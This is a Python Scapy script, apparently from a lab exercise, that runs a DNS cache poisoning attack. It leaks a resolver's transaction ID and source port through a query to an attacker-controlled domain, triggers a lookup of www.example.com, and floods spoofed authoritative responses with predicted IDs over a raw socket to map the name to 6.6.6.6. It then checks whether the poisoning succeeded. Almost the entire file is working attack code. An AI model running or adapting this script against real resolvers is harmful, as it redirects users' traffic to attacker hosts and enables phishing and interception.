from scapy.all import *
target_dns = "10.9.0.53"
dns_server = "10.9.1.153"
example_auth_dns = "10.9.0.154"
leak_ns_ip = "10.9.0.10"
victim_ip = "10.9.0.20"
fake_ip = "6.6.6.6"


def sniff_port_and_txid(max_attempts):
    print("[*] 1. Leaking resolver TXID/port via controlled domain...")
    for attempt in range(1, max_attempts + 1):
        print("[*] Leak attempt {}/{}...".format(attempt, max_attempts))
        sniffer = AsyncSniffer(
            iface="eth0",
            count=1,
            timeout=3,
            lfilter=lambda p: (
                p.haslayer(IP)
                and p.haslayer(UDP)
                and p.haslayer(DNS)
                and p[DNS].qr == 0
                and p[IP].src == target_dns
                and p[IP].dst == leak_ns_ip
                and p[UDP].dport == 53
            ),
        )
        sniffer.start()
        time.sleep(0.06)

        trigger_leak = (
            IP(dst=target_dns)
            / UDP(sport=12345, dport=53)
            / DNS(rd=1, qd=DNSQR(qname="leak.attacker.com", qtype="A"))
        )
        send(trigger_leak, verbose=0)

        sniffer.join()
        if sniffer.results and len(sniffer.results) > 0:
            leaked_txid = sniffer.results[0][DNS].id
            target_port = sniffer.results[0][UDP].sport
            print("[+] Leaked TXID: {}, Port: {}".format(leaked_txid, target_port))
            return leaked_txid, target_port

    print("[-] Could not leak TXID/port from local-dns to attacker.")
    exit(1)
#wait for the containers to come online
leaked_txid, target_port = sniff_port_and_txid(5)

print("[*] 3. Triggering resolver to query www.example.com...")
trigger_query = (
    IP(dst=target_dns)
    / UDP(sport=12345, dport=53)
    / DNS(rd=1, qd=DNSQR(qname="www.example.com", qtype="A"))
)
send(trigger_query, verbose=0)

print("[*] 4. Flooding spoofed responses...")
# Use the RAW SOCKET approach for speed
base_pkt = (
    IP(src=example_auth_dns, dst=target_dns) /
    UDP(sport=53, dport=target_port, chksum=0) /
    DNS(id=0, qr=1, aa=1, qd=DNSQR(qname="www.example.com"), 
        an=DNSRR(rrname="www.example.com", type='A', ttl=86400, rdata=fake_ip))
)

raw_bytes = bytearray(raw(base_pkt))
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

# Start just after the leaked ID. We send a small window (1-20) 
# to account for any background DNS activity on the resolver.
for i in range(1, 21):
    # Pack the NEXT txid into the raw bytearray (offset 28 is the DNS ID field)
    struct.pack_into('!H', raw_bytes, 28, (leaked_txid + i) % 65536)
    s.sendto(raw_bytes, (target_dns, 0))



test_query = IP(dst=target_dns)/UDP(sport=12346, dport=53)/DNS(rd=1, qd=DNSQR(qname="www.example.com"))
ans = sr1(test_query, timeout=2, verbose=0)

if ans and ans.haslayer(DNSRR) and ans[DNSRR].rdata == fake_ip:
    print("[+] Attack SUCCESSFUL! {} is poisoned to {}".format("www.example.com", fake_ip))
else:
    print("[-] Attack FAILED. Cache shows different or timeout.")